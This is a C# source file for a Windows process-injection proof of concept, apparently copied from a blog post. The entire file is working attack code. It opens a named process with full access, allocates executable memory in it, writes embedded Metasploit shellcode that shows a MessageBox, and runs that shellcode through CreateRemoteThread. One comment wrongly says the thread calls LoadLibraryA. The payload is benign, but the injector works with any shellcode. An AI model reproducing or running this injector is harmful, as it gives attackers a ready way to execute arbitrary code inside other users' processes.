// stolen from https://www.andreafortuna.org/2019/03/06/a-simple-windows-code-injection-example-written-in-c/
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

	public class InjectionPoC
	{
		
		[DllImport("kernel32.dll")]
	    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
	
	    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	    public static extern IntPtr GetModuleHandle(string lpModuleName);
	
	    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	
	    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
	    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
	
	    [DllImport("kernel32.dll", SetLastError = true)]
	    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
	
	    [DllImport("kernel32.dll")]
	    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		public static void Main(string[] args)
		{			
			if (args.Length == 0)
			{
			    System.Console.WriteLine("Please enter process name...");
			    System.Console.WriteLine("Usage: CodeInjectionPoC [process name]");
			    return;
			}

			Console.WriteLine("Start injection...");
			Process targetProcess;
			
			try {
				targetProcess = Process.GetProcessesByName(args[0])[0];	
			}
			catch {
				System.Console.WriteLine("Process " + args[0] + " not found!");
				return;
			}
						
			// Get process handler
			IntPtr process_handle = OpenProcess(0x1F0FFF, false, targetProcess.Id);
			
			// The MessageBox shellcode, generated with Metasploit
			string shellcodeStr =			
			"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64" +
			"\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e" +
			"\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60" +
			"\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b" +
			"\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01" +
			"\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d" +
			"\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01" +
			"\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01" +
			"\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x04\x29\xd4\x89\xe5\x89" +
			"\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45" +
			"\x04\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68\x75\x73" +
			"\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56\xff\x55\x04" +
			"\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52\xe8\x70" +
			"\xff\xff\xff\x68\x6f\x43\x58\x20\x68\x6f\x6e\x20\x50\x68" +
			"\x65\x63\x74\x69\x68\x20\x49\x6e\x6a\x68\x43\x6f\x64\x65" +
			"\x31\xdb\x88\x5c\x24\x12\x89\xe3\x68\x29\x58\x20\x20\x68" +
			"\x2e\x6f\x72\x67\x68\x74\x75\x6e\x61\x68\x61\x66\x6f\x72" +
			"\x68\x6e\x64\x72\x65\x68\x77\x77\x2e\x61\x68\x3a\x2f\x2f" +
			"\x77\x68\x74\x74\x70\x73\x68\x61\x20\x28\x68\x68\x72\x74" +
			"\x75\x6e\x68\x61\x20\x46\x6f\x68\x6e\x64\x72\x65\x68\x62" +
			"\x79\x20\x41\x68\x70\x65\x64\x20\x68\x76\x65\x6c\x6f\x68" +
			"\x79\x20\x64\x65\x68\x6f\x75\x64\x6c\x68\x2e\x20\x50\x72" +
			"\x68\x20\x50\x6f\x43\x68\x74\x69\x6f\x6e\x68\x6e\x6a\x65" +
			"\x63\x68\x64\x65\x20\x69\x68\x23\x20\x63\x6f\x68\x6c\x65" +
			"\x20\x43\x68\x53\x69\x6d\x70\x31\xc9\x88\x4c\x24\x61\x89" +
			"\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\xff\xd0";
			
			// Convert shellcode string to byte array
	        Byte[] shellcode = new Byte[shellcodeStr.Length];
	        for (int i = 0; i < shellcodeStr.Length; i++) 
	        {
	            shellcode [i] = (Byte) shellcodeStr [i];
	        }					
			
			// Allocate a memory space in target process, big enough to store the shellcode
			IntPtr memory_allocation_variable  = VirtualAllocEx(process_handle, IntPtr.Zero, (uint)(shellcode.Length),   0x00001000, 0x40);			

			// Write the shellcode
			UIntPtr bytesWritten;
			WriteProcessMemory(process_handle, memory_allocation_variable , shellcode, (uint)(shellcode.Length), out bytesWritten);			

			// Create a thread that will call LoadLibraryA with allocMemAddress as argument
			if (CreateRemoteThread(process_handle, IntPtr.Zero, 0, memory_allocation_variable , IntPtr.Zero, 0,IntPtr.Zero) != IntPtr.Zero) {
				Console.Write("Injection done!");	
			} else {
				Console.Write("Injection failed!");	
			}				
		}
	}
